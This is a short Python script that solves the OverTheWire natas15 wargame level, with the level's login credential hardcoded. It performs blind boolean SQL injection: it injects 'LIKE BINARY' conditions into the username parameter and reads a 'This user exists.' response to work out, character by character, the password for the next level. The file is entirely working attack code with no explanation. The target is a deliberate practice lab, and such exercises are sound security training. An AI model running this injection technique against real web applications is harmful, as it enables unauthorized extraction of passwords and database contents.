import requests, string

url = "http://natas15.natas.labs.overthewire.org/"

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

characters = ''.join([string.ascii_letters, string.digits])

passwd_chars = ""
es = "This user exists."

for c in characters:
	uri = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', c, '%', '&debug'])
	r = requests.get(uri, auth=(username, password))
	if es in r.text:
		passwd_chars += c
		print(passwd_chars)

print("Password characters: {}".format(passwd_chars))

passwd = ""
for i in range(64):
	for c in passwd_chars:
		test = passwd + c
		uri = ''.join([url, '?username=natas16"','+and+password+LIKE+BINARY+"', test, '%', '&debug'])
		r = requests.get(uri, auth=(username, password))
		if es in r.text:
			passwd = test
			print(passwd)
